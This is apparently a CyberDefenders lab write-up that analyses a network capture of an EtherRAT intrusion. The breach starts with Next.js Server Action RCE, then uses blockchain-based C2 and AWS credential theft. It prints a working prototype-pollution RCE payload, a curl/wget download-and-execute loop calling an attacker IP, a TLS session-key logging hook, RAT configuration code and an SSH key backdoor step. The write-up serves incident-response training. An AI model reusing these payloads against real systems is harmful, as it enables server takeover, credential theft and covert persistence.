# CallMeOnTheChain - EtherRAT Lab

![image.png](image.png)

# Context

Lab link: [https://cyberdefenders.org/blueteam-ctf-challenges/callmeonthechain-etherrat/](https://cyberdefenders.org/blueteam-ctf-challenges/callmeonthechain-etherrat/)

Suggested tools: Wireshark, `uniq`, `sort`, `tshark`, Etherscan.io

Tactics: Initial Access, Execution, Persistence, Privilege Escalation, Command and Control

# Scenario

Something is wrong at Maromalix. On February 10th, 2026, credentials that should never have left the network were suddenly used from an unauthorized external source. The trail led back to a single server: their public-facing web application. No failed logins, brute force, or phishing were detected, yet the attacker gained entry and established a way to return. This follows a pattern of Maromalix being targeted by attackers leveraging AI-assisted tooling. Using the captured network traffic, reconstruct the timeline and uncover exactly how this breach occurred.

# Initial Access

**Q1**- Start your analysis on the pcap. What is the IP address of the attacker that exploited the web application?

Answer: `63.180.69.24`

Reason: Packet Capture (PCAP) analysis of traffic to `172.31.44.238` shows automated GET/POST pairs from `63.180.69.24` hammering every endpoint (`/login`, `/register`, `/contact`, `/checkout`, `/profile`). The `python-requests/2.31.0` `User-Agent` confirms scripted tooling (MITRE ATT&CK T1595.002).

**Frame 34211** | `63.180.69.24` -> `172.31.44.238 POST /login HTTP/1.1User-Agent: python-requests/2.31.0 Next-Action: 16585177d96f96a914179445ccdf3ab2de95e19aBody: {"id":"test","bound":null}`

Each `POST` included `Next-Action: 16585177d96f96a914179445ccdf3ab2de95e19a`, a Server Action hash extracted from the app's compiled JavaScript, alongside the probe payload `{"id":"test"}` to identify which route binds to it. Since the attacker holds the hash but not its endpoint, brute-forcing all routes is the expected enumeration path (MITRE ATT&CK T1190). The same IP subsequently sent a prototype pollution Remote Code Execution (RCE) payload, confirming attacker attribution.

```yaml
POST /login HTTP/1.1
Host: 172.31.44.238
User-Agent: python-requests/2.31.0
Next-Action: 16585177d96f96a914179445ccdf3ab2de95e19a
Content-Type: application/json

{"id":"test","bound":null}
```

**Q2**- Now we have the attacker IP we can trace his activity easily. What is the CVE identifier for the vulnerability exploited in this attack?

Answer: CVE-2025-55182

Reason: The attacker exploited CVE-2025-55182, a Remote Code Execution (RCE) vulnerability in Next.js Server Actions. The payload abused React Flight deserialization by chaining two techniques: `$1:__proto__:then` pollutes `Object.prototype` to hijack promise resolution, while `$1:constructor:constructor` traverses the constructor chain to reach JavaScript's `Function` constructor. Together they allow the attacker to inject and execute arbitrary code during server-side deserialization (MITRE ATT&CK T1190).

The `_prefix` field carried a `child_process.execSync('id')` call via `process.mainModule.require`. Output was exfiltrated in-band through the `digest` field of a thrown `NEXT_REDIRECT` error, requiring no external listener. The server's `500` response confirmed execution under the application service account.

```python
# Frame 34695
POST /login HTTP/1.1
Host: maromalix.cloud
User-Agent: python-requests/2.31.0
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
Next-Action: x
Content-Length: 566
Content-Type: multipart/form-data; boundary=0831c0824afaeff28300394780f402f1

--0831c0824afaeff28300394780f402f1
Content-Disposition: form-data; name="0"

{"then": "$1:__proto__:then", "status": "resolved_model", "reason": -1, "value": "{\"then\": \"$B0\"}", "_response": {"_prefix": "var res = process.mainModule.require('child_process').execSync('id',{'timeout':300000}).toString().trim(); throw Object.assign(new Error('NEXT_REDIRECT'), {digest:`${res}`});", "_formData": {"get": "$1:constructor:constructor"}}}
--0831c0824afaeff28300394780f402f1
Content-Disposition: form-data; name="1"

"$@0"
--0831c0824afaeff28300394780f402f1--
HTTP/1.1 500 Internal Server Error
x-server-action-logged: true
Vary: RSC, Next-Router-State-Tree, Next-Router-Prefetch, Next-Router-Segment-Prefetch, Accept-Encoding
Cache-Control: no-cache, no-store, max-age=0, must-revalidate
x-nextjs-cache: HIT
x-nextjs-prerender: 1
Content-Type: text/x-component
Content-Encoding: gzip
Date: Tue, 10 Feb 2026 18:36:53 GMT
Connection: keep-alive
Keep-Alive: timeout=5
Transfer-Encoding: chunked

0:{"a":"$@1","f":"","b":"rV3gqqDZ4VcvybLCRFy_5"}
1:E{"digest":"uid=999(maromalix) gid=988(maromalix) groups=988(maromalix)"}
```

## Next JS Server Actions RCE Prototype Pollution

Next.js Server Actions are server-side functions compiled into the client bundle as deterministic hashes. Any client can invoke them directly over HTTP using the `Next-Action` header, making the hash the only "key" to execution. CVE-2025-55182 abuses the React Flight deserialization protocol that processes these requests, allowing an attacker to smuggle a crafted object graph that escapes the deserializer and reaches the `Function` constructor.

The exploit chain works in three steps. First, `$1:__proto__:then` poisons `Object.prototype` to hijack promise resolution during deserialization. Second, `$1:constructor:constructor` traverses the prototype chain to reach JavaScript's native `Function` constructor. Third, the `_prefix` field injects a `child_process.execSync` call via `process.mainModule.require`, executing arbitrary shell commands in the server process. No separate listener or callback channel is needed as output is returned in-band through the `digest` field of a thrown `NEXT_REDIRECT` error, making the exfiltration invisible to most network monitors watching for outbound callbacks.

What makes this pattern dangerous at scale is the enumeration phase that precedes it. Server Action hashes are static and publicly readable from the compiled JavaScript bundle, meaning an attacker can extract valid hashes through passive reconnaissance alone. The blind route-binding scan observed in the earlier frames is the standard setup, probing which endpoint will execute the target function before delivering the payload.

The result is a low-noise, in-band RCE with no shellcode, no binary drops, and no outbound connections: just a malformed multipart POST and a `500` response carrying `uid=999(maromalix)` in the error digest.

# Execution

**Q3**- What is the filename of the script downloaded by the exploit payload to install the malware?

Answer: `s.sh`

Reason: With Remote Code Execution (RCE) confirmed, the attacker swapped the `id` probe for a persistent download-and-execute loop targeting `63.176.62.199:443`. The shell command attempted to pull `s.sh` via `curl`, falling back to `wget` if unavailable, both with certificate validation disabled to avoid Trust Store failures against the attacker's self-signed HTTPS listener. The `[ -s ./s.sh ]` check gated execution on a non-empty file, preventing a broken download from running. On success, `s.sh` was made executable and launched detached via `nohup`, then the loop broke. On failure, a `sleep 300` retry held the loop open, giving the attacker a five-minute reconnect window if the stager was temporarily unavailable (MITRE ATT&CK T1059.004: Unix Shell, T1105: Ingress Tool Transfer).

**Frame 35786** | `63.180.69.24` -> `172.31.44.238 POST /login HTTP/1.1 Next-Action: 16585177d96f96a914179445ccdf3ab2de95e19a`

The detached `nohup` execution means `s.sh` survived the HTTP request lifecycle and continued running independently of the Server Action process.

```bash
while :; do
  (curl -sk hxxps://63.176.62.199:443/s.sh -o ./s.sh ||  # -s silent, -k disables cert validation
   wget -qO ./s.sh hxxps://63.176.62.199:443/s.sh --no-check-certificate) &&
  [ -s ./s.sh ] &&   # -s checks file exists and is non-empty
  chmod +x ./s.sh &&
  (nohup ./s.sh >/dev/null 2>&1 &) &&   # nohup detaches from parent process, survives session exit
  break;
  sleep 300;
done
```

**Q4**- What is the filename of the decrypted implant that serves as the main RAT?

Answer: `.7vfgycfd01.js`

Reason: Stage 2 of `s.sh` functioned as a JavaScript dropper, hardcoding the final implant path as a constant before writing it to disk. The filename `.7vfgycfd01.js` uses a leading dot to suppress it from standard `ls` output on Linux, requiring `ls -a` to reveal it (MITRE ATT&CK T1564.001: Hidden Files and Directories). Placement inside a designated malware directory suggests the earlier stages created and configured that directory as part of the installation routine.

**Frame ~35797+N** | `s.sh` execution on `172.31.44.238`

The `.js` extension confirms the implant runs under Node.js, consistent with the compromised Next.js server environment where Node.js is already present and trusted, removing any need to drop a foreign binary.

```jsx
const DECRYPTED_IMPLANT = path.join(MALWARE_DIR, '.7vfgycfd01.js');
```

## Hooking to and Stealing TLS Session Keys

The EtherRAT dropper abused Node.js's `keylog` socket event, a feature originally exposed for Network Security Services (NSS) keylog-format debuggers like Wireshark, by monkey-patching `tls.connect` and `https.request` at runtime. Wrapping the originals allowed the implant to intercept every outbound Transport Layer Security (TLS) socket the server opened without modifying any application code. Each derived session key was silently appended to `/tmp/.font-unix/.cache`, a path camouflaged as a legitimate font cache directory to blend into routine filesystem noise (MITRE ATT&CK T1557: Adversary-in-the-Middle, T1040: Network Sniffing).

The output is a continuously growing NSS keylog file. Any party holding this file alongside the corresponding packet capture can decrypt every outbound HTTPS session the server made, retrospectively, with no active interception required.

Note: Monkey-patching replaces a built-in function at runtime without modifying the original source code. Instead of editing `Node.js` itself, the RAT saves a reference to the real `tls.connect` as `_c`, then overwrites `tls.connect` with a wrapper that calls the original function and registers the key logger. After the overwrite, every module in the process that calls `tls.connect` uses the modified implementation, even though the call sites do not change. It is the software equivalent of swapping a light switch with one that also signals a recording device, the light still works and the change is not obvious.

```jsx
const fs = require('fs'), tls = require('tls'), p = '/tmp/.font-unix/.cache'; // hidden keylog output path
const _c = tls.connect;                                   // stash original tls.connect
tls.connect = function (...a) {
    const s = _c.apply(this, a);                          // call original, get socket
    s.on('keylog', l => fs.appendFileSync(p, l));         // attach keylog listener, append each session key
    return s;
};

const h = require('https'), _r = h.request;               // stash original https.request
h.request = function (...a) {
    const r = _r.apply(this, a);
    r.on('socket', s => s.on && s.on('keylog', l => fs.appendFileSync(p, l))); // same keylog hook on https sockets
    return r;
};
```

# Defense Evasion

**Q5**- What is the hidden directory path used by the malware to store its components?

Answer: `~/.local/share/.05bf0e9b`

Reason: The installer established persistence infrastructure by nesting a dot-prefixed directory inside `~/.local/share/`, a legitimate Extended Desktop Group (XDG) user data path that rarely draws defender attention. The directory name `.05bf0e9b` appears randomly generated, providing no recognizable string to alert on (MITRE ATT&CK T1564.001: Hidden Files and Directories).

All three components are co-located inside this directory: the encrypted blob `.1d5j6rm2mg2d`, the Stage 2 dropper `.kxnzl4mtez.js`, and the decrypted RAT implant `.7vfgycfd01.js`. The script also resolved a private Node.js installation path under `.4dai8ovb`, pinned to `v20.11.0`, likely to ensure a controlled runtime independent of whatever Node.js version the compromised server runs.

```bash
MALWARE_DIR="$HOME/.local/share/.05bf0e9b"   # hidden malware root under legitimate XDG path
NODE_DIR="$MALWARE_DIR/.4dai8ovb"             # private Node.js runtime, isolated from system install
NODE_VERSION="v20.11.0"
NODE_URL="https://nodejs.org/dist/${NODE_VERSION}/node-${NODE_VERSION}-linux-x64.tar.xz"
```

```
~/.local/share/.05bf0e9b/
├── .1d5j6rm2mg2d       # encrypted RAT blob
├── .kxnzl4mtez.js      # Stage 2 dropper
└── .7vfgycfd01.js      # decrypted RAT implant
```

**Q6**- The malware checks system locale to avoid execution in certain regions. What is the first locale code in the blocklist?

Answer: `ru`

Reason: The dropper's decryption routine used Advanced Encryption Standard 256-bit Cipher Block Chaining (AES-256-CBC) with both key and Initialization Vector (IV) derived from UTF-8 strings via `Buffer.from(KEY, 'utf8')`, and the encrypted blob stored as Base64. Replicating this in CyberChef required a two-step recipe: From Base64 to decode the blob into raw bytes, followed by AES Decrypt in CBC mode with UTF-8 key and IV, yielding the plaintext source of `.7vfgycfd01.js`.

The decrypted implant header confirmed this as EtherRAT Stage 3. A locale blocklist at startup functions as a jurisdiction guard: the RAT checks the system locale and silently exits on any match, preventing execution in Commonwealth of Independent States (CIS) and adjacent regions and protecting the operator from self-infection (MITRE ATT&CK T1497.001: Virtualization/Sandbox Evasion). The blocklist covers Russia (`ru`), Belarus (`be`), Kazakhstan (`kk`), Kyrgyzstan (`ky`), Tajikistan (`tg`), Uzbekistan (`uz`), Armenia (`hy`), Azerbaijan (`az`), and Georgia (`ka`), a pattern consistent with Russian-nexus threat actor tradecraft.

```jsx
// s.sh decryption function
const ALGORITHM = 'aes-256-cbc';
const KEY = 'a3f8b2c1d4e5f6a7b8c9d0e1f2a3b4c5';
const IV = 'd4e5f6a7b8c9d0e1';

function decrypt(encryptedData) {
    const key = Buffer.from(KEY, 'utf8');
    const iv = Buffer.from(IV, 'utf8');
    
    const decipher = crypto.createDecipheriv(ALGORITHM, key, iv);
    let decrypted = decipher.update(encryptedData, 'base64', 'utf8');
    decrypted += decipher.final('utf8');
    
    return decrypted;
}

// RAT impant locales
const BANNED_LOCALES = ['ru', 'be', 'kk', 'ky', 'tg', 'uz', 'hy', 'az', 'ka'];
```

```
CyberChef recipe:
1. From Base64 (alphabet: A-Za-z0-9+/=, remove non-alphabet chars)
2. AES Decrypt (mode: CBC, key: UTF-8, IV: UTF-8, input: raw, output: raw)
```

![image.png](image%201.png)

# Command and Control

**Q7**- What are the two smart contract addresses used for C2 resolution in this malware? (Format: in the order they are queried)

Answer: `0x22f96d61cf118efabc7c5bf3384734fad2f6ead4`, `0xb0cbaA51b3D1D36e8E95F4F68dfBd47ED2eaA7a4`

Reason: The implant implements a dual-contract blockchain C2 architecture with built-in fallback, querying Ethereum smart contracts instead of traditional domains to receive operator commands. The primary contract lives on Ethereum mainnet at `0x22f96d61cf118efabc7c5bf3384734fad2f6ead4`, resolved through a pool of eight public Remote Procedure Call (RPC) endpoints including `eth.llamarpc[.]com`, `rpc.flashbots[.]net`, and `rpc.mevblocker[.]io`. All are legitimate, widely-used infrastructure, making this traffic visually indistinguishable from normal cryptocurrency wallet activity and effectively invisible to domain-based blocklists (MITRE ATT&CK T1102: Web Service, T1008: Fallback Channels).

If the primary contract is unreachable, the implant falls back to a secondary contract at `0xb0cbaA51b3D1D36e8E95F4F68dfBd47ED2eaA7a4` on the Sepolia testnet via `ethereum-sepolia-rpc.publicnode[.]com`. Blockchain-based C2 is resilient by design: contracts cannot be taken down, domains cannot be sinkholed, and RPC endpoints can be swapped without recompiling the implant.

```
PRIMARY  (Ethereum mainnet)
  Contract : 0x22f96d61cf118efabc7c5bf3384734fad2f6ead4
  RPC pool  : eth.llamarpc[.]com, rpc.flashbots[.]net, rpc.mevblocker[.]io (+5 others)

FALLBACK (Sepolia testnet)
  Contract  : 0xb0cbaA51b3D1D36e8E95F4F68dfBd47ED2eaA7a4
  RPC       : ethereum-sepolia-rpc.publicnode[.]com
```

```jsx
// ============================================
// EtherRAT - Stage 3 Main Implant
// Blockchain-based C2 with multi-contract fallback
// Filename on victim: .7vfgycfd01.js
// ============================================

const https = require('https');
const http = require('http');
const os = require('os');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');

// ============================================
// CONFIGURATION
// ============================================

const CONTRACTS = [
    {
        name: 'PRIMARY',
        rpc: [
            'https://eth.llamarpc.com',
            'https://mainnet.gateway.tenderly.co',
            'https://rpc.flashbots.net/fast',
            'https://rpc.mevblocker.io',
            'https://eth-mainnet.public.blastapi.io',
            'https://ethereum-rpc.publicnode.com',
            'https://eth.drpc.org',
            'https://eth.merkle.io'
        ],
        contract: '0x22f96d61cf118efabc7c5bf3384734fad2f6ead4',
        lookup: '0xE941A9b283006F5163EE6B01c1f23AA5951c4C8D'
    },
    {
        name: 'FALLBACK',
        rpc: ['https://ethereum-sepolia-rpc.publicnode.com'],
        contract: '0xb0cbaA51b3D1D36e8E95F4F68dfBd47ED2eaA7a4',
        lookup: '0x1d978D230b51c2eF3Fd780514c00e926ad9A47b1'
    }
];
```

## Smart Contracts as C2 Infrastructure

Traditional Command and Control (C2) infrastructure lives and dies by its domains. Defenders sinkhole them, registrars suspend them, and threat intelligence feeds propagate the block within hours. Blockchain-based C2 discards this entire attack surface by moving the command channel onto a smart contract, an immutable piece of code deployed to a decentralized network that no single party controls or can remove.

The operator deploys a contract once to Ethereum mainnet. The implant, compiled with the contract address hardcoded, queries a public RPC endpoint to call a read function on that contract and retrieve its current command string. The operator updates commands by sending a transaction to the contract. No domain registration, no server, no infrastructure to burn.

The defensive problem is threefold. First, the contract address is permanent. Unlike a domain that expires or gets suspended, a deployed contract exists for as long as the Ethereum network does. Second, RPC endpoints are interchangeable. EtherRAT carried a pool of eight, all operated by legitimate infrastructure providers like Flashbots and LlamaRPC. Blocking one changes nothing. Third, the traffic is indistinguishable from normal Web3 activity. A compromised server polling `rpc.flashbots[.]net` over HTTPS looks identical to a cryptocurrency wallet checking a balance.

The Sepolia testnet fallback adds another layer of resilience. If every mainnet RPC is somehow blocked at the network perimeter, the implant pivots to the testnet contract via a separate node. The operator maintains command continuity across both chains simultaneously with no additional infrastructure cost.

Hunting this pattern requires moving beyond domain and IP Indicators of Compromise (IOCs). Detection anchors on behavior: a server process making repeated HTTPS POST requests with JSON-RPC bodies containing `eth_call` to public Ethereum nodes, particularly to contract addresses not associated with any legitimate application dependency. Ethereum contract addresses in outbound request bodies, combined with a non-browser process as the originator, are a high-fidelity signal regardless of which RPC provider is being used.

**Q8**- Search the Ethereum network. When was the primary smart contract deployed on the Ethereum network (UTC)?

Answer: `2025-12-05 19:13:47`

Reason: Querying the primary contract on Etherscan confirmed the deployer wallet as `0xE941A9b283006F5163EE6B01c1f23AA5951c4C8D`, matching the lookup address hardcoded in the implant configuration and directly attributing the contract to the operator. The deployment timestamp of `2025-12-05 19:13:47 UTC` (Unix `1764962027`) places infrastructure staging approximately two months before the February 10 attack, confirming deliberate pre-positioning rather than opportunistic tooling (MITRE ATT&CK T1587.001: Develop Capabilities, Malware).

This gap between deployment and use is operationally significant. The operator established a permanent, uncensorable C2 channel on Ethereum mainnet, then sat on it until a target was identified and exploited. The contract address is immutable evidence of premeditation and can be used to pivot: any other contract deployed by `0xE941A9b283006F5163EE6B01c1f23AA5951c4C8D`, or any wallet that funded it, may reveal additional infrastructure or prior campaigns.

```
Contract  : 0x22f96d61cf118efabc7c5bf3384734fad2f6ead4
Deployer  : 0xE941A9b283006F5163EE6B01c1f23AA5951c4C8D
Deployed  : 2025-12-05 19:13:47 UTC (Unix 1764962027)
Delta     : ~67 days before February 10 attack

https://etherscan.io/tx/0x797080597f0af35c755ded2e8d8d1fd00c7b46412fb4aebf2e73b486747d2e1d
```

**Q9**- Since the smart contract is deployed on a public blockchain, its source code can be obtained. Obtain and decompile the code, what function name is used to retrieve the stored C2 URL?

Answer: `getString`

Reason: With the contract address extracted from the RAT config, bytecode decompilation via `ethervm.io/decompile` exposed the dispatch table, revealing two function selectors: `0x7fcaf666` resolving cleanly to `setString(string)`, and `0x7d434425` listed as unknown. Cross-referencing the unknown selector against `4byte.directory`, a public registry of keccak256 function signature fragments, returned `getString(address)`, confirming the read function the implant uses to retrieve its C2 URL.

The two selectors map directly to the contract's full interface: the operator calls `setString` to write or update a C2 URL mapped to their wallet address, and the implant calls `getString` using raw selector `0x7d434425` plus the ABI-encoded lookup address, bypassing any named Application Binary Interface (ABI) entirely and speaking raw EVM directly to whichever of the eight RPC nodes responds first (MITRE ATT&CK T1102: Web Service).

```
1. ethervm.io/decompile → 0x22f96d61cf118efabc7c5bf3384734fad2f6ead4
   Dispatch table:
     0x7fcaf666 → setString(string)   # operator write function
     0x7d434425 → unknown             # implant read function

2. 4byte.directory → query: 7d434425
   Result: getString(address)

3. RAT call construction:
   data = '0x7d434425' + paddedLookupAddress
   → eth_call to any RPC node → returns C2 URL
```

**Q10**- What is the transaction hash of the first C2 URL published to the primary contract?

Answer: `0xe4efe4d2b118229161f7023e13ab98b54180fbfb1756d11959e4f19238b9655d`

Reason: Reading the transaction list chronologically, the deployment transaction `0x60806040` at block `23948742` is immediately followed by a `setString` call publishing the initial C2 URL, confirming the operator configured the channel in the same session as deployment. The transaction hash `0xe4efe4d2b118229161f7023e13ab98b54180fbfb1756d11959e4f19238b9655d` is the on-chain record of the first C2 URL being written, and serves as immutable, timestamped evidence of operator activity attributable to deployer wallet `0xE941A9b283006F5163EE6B01c1f23AA5951c4C8D` (MITRE ATT&CK T1583: Acquire Infrastructure).

The initial C2 URL `hxxp://91.215.85.42:3000` points to a bare IP on port `3000`, consistent with a Node.js-based implant handler running without a reverse proxy.

```
Block     : 23948742 (2025-12-05)
Deploy tx : 0x797080597f0af35...
C2 tx     : 0xe4efe4d2b118229161f7023e13ab98b54180fbfb1756d11959e4f19238b9655d
setString : hxxp://91.215.85.42:3000
```

![image.png](image%202.png)

**Q11**- When did the implant retrieve the C2 URL from the blockchain (UTC)?

Answer: 2026-02-10 18:37

Reason: Frame `38646` captured the first observable sign of implant execution: a simultaneous burst of Transport Layer Security 1.3 (TLSv1.3) Client Hello messages fired concurrently to four Ethereum RPC endpoints, with Server Name Indication (SNI) fields confirming each destination. This pattern directly reflects the RAT's `Promise.all` call, which queries all eight hardcoded RPC nodes in parallel and takes the first consensus result as the authoritative C2 URL, minimising resolution latency and avoiding any single point of failure (MITRE ATT&CK T1102: Web Service, T1008: Fallback Channels).

The timestamp `2026-02-10 18:37 UTC` marks the moment the implant initiated blockchain C2 resolution, establishing a precise post-exploitation timeline anchor. All four destination IPs are legitimate Ethereum infrastructure, producing no alertable domain or IP signals against standard threat intelligence feeds.

**Frame 38646** | `172.31.44.238` -> multiple Ethereum RPC endpoints → `2026-02-10 18:37 UTC` | `TLSv1.3 Client Hello burst`

```
Frame 38646 | 2026-02-10 18:37 UTC
172.31.44.238 → 35.227.193.242   TLSv1.3  Client Hello (SNI=mainnet.gateway.tenderly.co)
172.31.44.238 → 104.26.15.157    TLSv1.3  Client Hello (SNI=eth.llamarpc.com)
172.31.44.238 → 104.18.11.61     TLSv1.3  Client Hello (SNI=rpc.mevblocker.io)
172.31.44.238 → 172.66.150.162   TLSv1.3  Client Hello (SNI=ethereum-rpc.publicnode.com)
```

![image.png](image%203.png)

**Q12**- What C2 URL did the implant retrieve from the blockchain during execution?

Answer: hxxps://63.176.62.199:443

Reason: Frame `38646` captured the first observable sign of implant execution: a simultaneous burst of Transport Layer Security 1.3 (TLSv1.3) Client Hello messages fired concurrently to four Ethereum RPC endpoints, with Server Name Indication (SNI) fields confirming each destination. This pattern directly reflects the RAT's `Promise.all` call, which queries all eight hardcoded RPC nodes in parallel and takes the first consensus result as the authoritative C2 URL, minimising resolution latency and avoiding any single point of failure (MITRE ATT&CK T1102: Web Service, T1008: Fallback Channels).

The timestamp `2026-02-10 18:37 UTC` marks the moment the implant initiated blockchain C2 resolution, establishing a precise post-exploitation timeline anchor. All four destination IPs are legitimate Ethereum infrastructure, producing no alertable domain or IP signals against standard threat intelligence feeds.

**Frame 38646** | `172.31.44.238` -> multiple Ethereum RPC endpoints → `2026-02-10 18:37 UTC` | `TLSv1.3 Client Hello burst`

```
Frame 38646 | 2026-02-10 18:37 UTC
172.31.44.238 → 35.227.193.242   TLSv1.3  Client Hello (SNI=mainnet.gateway.tenderly.co)
172.31.44.238 → 104.26.15.157    TLSv1.3  Client Hello (SNI=eth.llamarpc.com)
172.31.44.238 → 104.18.11.61     TLSv1.3  Client Hello (SNI=rpc.mevblocker.io)
172.31.44.238 → 172.66.150.162   TLSv1.3  Client Hello (SNI=ethereum-rpc.publicnode.com)
```

**Q13**- What is the Bot ID assigned to the compromised host?

Answer: `4ebfbc8aedf60511`

Reason: The RAT generates a persistent bot ID by MD5-hashing a pipe-delimited fingerprint of hostname, username, Central Processing Unit (CPU) model, and total memory, then truncating to the first 16 hex characters. The deterministic construction means the ID is stable across reboots and re-infections without requiring local storage, but also means it can be reproduced analytically given host metadata (MITRE ATT&CK T1033: System Owner/User Discovery, T1082: System Information Discovery).

Frame `38805` captured the first stage report POST to `63.176.62.199:443`, confirming successful C2 URL resolution from the blockchain and initial implant check-in. The URI structure `/api/stage/4ebfbc8aedf60511/0` embeds the bot ID and stage number `0` directly in the path, making the compromised host immediately identifiable in server-side logs. The spoofed `Mozilla/5.0` User-Agent blends beacon traffic with browser-like patterns to evade superficial traffic inspection (MITRE ATT&CK T1071.001: Web Protocols).

**Frame 38805** | `172.31.44.238` -> `63.176.62.199:443 -> 2026-02-10 18:37:25 UTC` | `POST /api/stage/4ebfbc8aedf60511/0`

```jsx
function generateBotId() {
    const components = [
        os.hostname(),                        // host fingerprint component 1
        os.userInfo().username,               // host fingerprint component 2
        os.cpus()[0]?.model || 'unknown',     // host fingerprint component 3
        os.totalmem().toString()              // host fingerprint component 4
    ];
    const hash = crypto.createHash('md5')
        .update(components.join('|'))
        .digest('hex');
    return hash.slice(0, 16);                 // truncate to 16 hex chars
}
// Result: 4ebfbc8aedf60511

Frame 38805 | 2026-02-10 18:37:25 UTC
172.31.44.238:57196 → 63.176.62.199:443
POST /api/stage/4ebfbc8aedf60511/0 HTTP/1.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36
```

# Credential Access

**Q14**- Once connected to the C2, the implant started executing multi-stage payloads. What is the endpoint path used for exfiltrating harvested credentials?

Answer: `/crypto/keys`

Reason: Twenty-five seconds after initial check-in, the implant posted harvested Amazon Web Services (AWS) credentials to `/crypto/keys`, an endpoint name deliberately ambiguous against legitimate cryptocurrency traffic. The payload exposed two AWS profiles: `default` and `production`, each containing an Access Key ID and Secret Access Key, along with regional configuration from `~/.aws/config` (MITRE ATT&CK T1552.001: Credentials in Files, T1041: Exfiltration Over C2 Channel).

The speed of exfiltration, twenty-five seconds from first beacon to credential theft, indicates the AWS credential harvesting is an automated early-stage routine rather than interactive operator activity. With valid AWS access keys in hand, the attacker gains potential access to the victim's entire cloud environment, making this the highest-impact event in the kill chain to this point.

**Frame 39622** | `172.31.44.238` -> `63.176.62.199:443 -> 2026-02-10 18:37:50 UTC` | `POST /crypto/keys`

```
POST /crypto/keys HTTP/1.1
Host: 63.176.62.199:443

{
  "type":  "credentials",
  "botId": "4ebfbc8aedf60511",
  "files": {
    "aws_credentials": "[default]\naws_access_key_id = AKIAIOSFODNN7EXAMPLE...",
    "aws_config":      "[default]\nregion = us-east-1\n..."
  }
}
```

# Persistence

**Q15**- What is the filename of the `systemd` user service created for persistence?

Answer: `c16a536e1a9cb42d.service`

Reason: Forty seconds after initial check-in, the implant reported two simultaneous persistence mechanisms installed under the `maromalix` service account. The primary method created a systemd user service at `/home/maromalix/.config/systemd/user/c16a536e1a9cb42d.service`, which survives reboots and re-executes the RAT automatically on user login without requiring root privileges. The secondary method dropped an Extended Desktop Group (XDG) autostart entry at `/home/maromalix/.config/autostart/a5eae68533ea066c.desktop`, providing a fallback for graphical desktop environments where systemd user services are unavailable (MITRE ATT&CK T1543.002: Systemd Service, T1547.013: XDG Autostart).

Both filenames follow the same randomized hex convention as other malware components, producing no recognizable string pattern to alert on. The use of user-space persistence paths rather than system-wide directories keeps all activity within the compromised account's home directory, requiring no privilege escalation and leaving no trace in commonly monitored system paths.

**Frame 40567** | `172.31.44.238` -> `63.176.62.199:443 -> 2026-02-10 18:38:05 UTC` | `POST /4ebfbc8aedf60511`

```
Frame 40567 | 2026-02-10 18:38:05 UTC
POST /4ebfbc8aedf60511

methods:
  systemd:
    success : true
    path    : /home/maromalix/.config/systemd/user/c16a536e1a9cb42d.service
  xdg:
    path    : /home/maromalix/.config/autostart/a5eae68533ea066c.desktop
```

## User Space Persistence on Linux

Most Linux persistence techniques taught in security courses target system-wide paths: dropping a service into `/etc/systemd/system/`, adding a cron job to `/etc/cron.d/`, or writing to `/etc/init.d/`. All of these require root privileges, generate privilege escalation events, and land in directories that defenders commonly monitor. User-space persistence deliberately avoids all three problems by staying entirely within the compromised user's home directory.

The core insight is that Linux gives every user a private configuration directory at `~/.config/` that they own completely. No sudo, no elevated privileges, no system-wide writes required. Anything placed here executes with the same permissions as the user, which in a web application compromise like this one means the application service account, often with access to cloud credentials, database connections, and internal network resources.

**The two mechanisms work like this:**

Systemd user services live at `~/.config/systemd/user/`. When a user logs in, systemd spawns a per-user instance (`systemd --user`) that reads and manages services from this directory exactly like the system-wide systemd reads `/etc/systemd/system/`. The attacker creates a `.service` file pointing at the RAT binary, and it starts automatically on every login with no root involvement and no entry in `systemctl status` unless you specifically query `systemctl --user status`.

XDG autostart entries live at `~/.config/autostart/`. Desktop environments like GNOME and KDE read `.desktop` files from this directory on session start and execute whatever binary they point to. This is the same mechanism legitimate applications like Dropbox and Slack use to launch at login, making malicious entries visually indistinct from normal software.

**Why they are paired:**

A headless Linux server running a Next.js application likely has no desktop environment, so the XDG entry never fires. But systemd user services work perfectly on servers. Conversely, a developer workstation might have a desktop environment but systemd user services disabled. By installing both, the attacker guarantees persistence fires on either target type with a single installer routine, no environment detection needed.

**Why this is hard to catch:**

Standard file integrity monitoring tools are commonly scoped to system paths. `~/.config/systemd/user/` and `~/.config/autostart/` are dotfile directories that look identical to legitimate application configuration. The filenames EtherRAT used, `c16a536e1a9cb42d.service` and `a5eae68533ea066c.desktop`, carry no recognizable strings. No privilege escalation occurs, no system logs capture the installation, and `ps aux` shows the RAT running as `maromalix`, indistinguishable from any other user process.

Detection requires either file integrity monitoring explicitly scoped to user config directories, or behavioral rules triggering on `.service` or `.desktop` files written by non-interactive parent processes such as a Node.js web server spawning shell commands.

**Q16**- What is the comment field in the attacker's injected SSH public key?

Answer: `maromalix@ether_dev`

Reason: The beacon disguised itself as an image fetch using a `.jpg` extension in the Uniform Resource Identifier (URI) path, while the C2 responded with `application/javascript`, a deliberate content-type mismatch designed to confuse shallow traffic inspection that classifies requests by file extension rather than actual response headers (MITRE ATT&CK T1001: Data Obfuscation).

The returned payload hardcoded the attacker's Rivest-Shamir-Adleman (RSA) public key as `ATTACKER_KEY`, with the comment field `maromalix@ether_dev` serving as an operator handle embedded directly in the key string. The `installSSHKey()` function appended it to `/home/maromalix/.ssh/authorized_keys`, granting the attacker direct Secure Shell (SSH) access to the host independent of the RAT entirely. This is a critical escalation: even if the RAT is detected and removed, the SSH key survives as a separate, silent access path requiring no network callback, no blockchain resolution, and no implant process (MITRE ATT&CK T1098.004: SSH Authorized Keys).

Frame `40785` confirmed successful installation with fingerprint `SHA256:1RquAvdtW48Ken6IVUZi/o4liu1SXlvezhgjb2fnvBg` reported back to C2.

**Frame 40782-40785** | `172.31.44.238` -> `63.176.62.199:443 -> 2026-02-10 18:38 UTC` | SSH key implant stage

```
Frame 40782 | beacon
GET /api/311092f6/4ebfbc8aedf60511/28c9f84a.jpg
Response: Content-Type: application/javascript    # content-type mismatch

ATTACKER_KEY = 'ssh-rsa AAAAB3NzaC1yc2E... maromalix@ether_dev'

Frame 40785 | confirmation
POST /4ebfbc8aedf60511
  success     : true
  path        : /home/maromalix/.ssh/authorized_keys
